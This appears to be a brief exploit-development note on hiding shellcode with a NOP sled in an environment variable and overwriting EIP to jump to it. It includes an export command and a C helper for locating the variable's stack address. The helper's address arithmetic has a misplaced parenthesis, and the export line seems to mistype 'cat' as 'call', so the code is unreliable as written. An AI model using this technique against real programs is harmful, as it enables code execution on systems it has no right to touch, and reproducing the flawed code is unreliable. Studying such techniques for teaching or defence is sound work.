# Environment

---

Useful if there is not enough space in buffer for shellcode. Environment can be found near the bottom of the stack. Overwrite EIP with address of shellcode in stack.

```sh
export SHELLCODE=$(python -c 'print("\x90" * 20)')$(call shell.bin)
```

Address of the environment variable can be found with the following program.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char* argv[])
{
    if (argc < 3)
    {
        printf("Usage: %s <environment var> <target program name>\n", argv[0]);
        exit(0);
    }

    char* ptr = getenv(argv[1]); // Get env variable location
    ptr += (strlen(argv[0] - strlen(argv[2]))) * 2; // Adjust for program name
    printf("%s will be at %p\n", argv[1], ptr);
}
```
